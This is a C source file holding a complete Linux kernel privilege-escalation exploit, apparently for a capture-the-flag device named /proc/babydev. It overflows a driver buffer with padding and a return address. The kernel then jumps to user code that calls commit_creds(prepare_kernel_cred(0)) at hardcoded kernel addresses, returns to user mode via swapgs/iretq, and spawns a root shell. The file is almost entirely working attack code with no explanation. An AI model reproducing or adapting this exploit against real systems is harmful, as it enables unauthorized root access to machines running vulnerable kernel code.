#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);
  
struct trap_frame {
    void *user_rip; 
    unsigned long long user_cs; 
    unsigned long long user_rflags;  
    void *user_rsp;
    unsigned long long user_ss;
} __attribute__((packed));
struct trap_frame tf;

void shell()
{
    execl("/bin/sh", "sh", NULL);
    return;
}

void prepare_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    tf.user_rip = &shell ;
}

void root(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
    : : "r" (&tf));
}

int main()
{
    prepare_tf();

    int fd = open("/proc/babydev", O_RDWR);
 
    char *pay = calloc(1, 0x1000);
    commit_creds = 0xffffffff81052830;
    prepare_kernel_cred = 0xffffffff81052a60;

    unsigned long long rop[0x400] = {&root,};
    
    memset(pay, 0x41, 0x74+0x8);
    memcpy(pay+0x74+0x8, rop, 0x100);

    write(fd, pay, 0x200);

}
